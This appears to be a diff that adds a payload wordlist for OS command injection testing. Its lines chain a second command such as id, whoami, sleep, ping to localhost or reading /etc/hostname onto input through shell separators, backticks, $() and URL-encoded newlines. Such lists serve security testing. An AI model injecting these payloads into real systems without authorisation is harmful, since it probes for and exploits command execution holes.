@@ -1,0 +1,17 @@
+## OS command injection probes (harmless commands only: id / whoami / sleep / echo)
+; id
+| id
+|| id
+& id
+&& id
+`id`
+$(id)
+; whoami
+| whoami
+&& whoami
+; sleep 5
+| sleep 5
+& ping -n 5 127.0.0.1
+%0Aid
+%0A/bin/cat%20/etc/hostname
+; echo topautomation
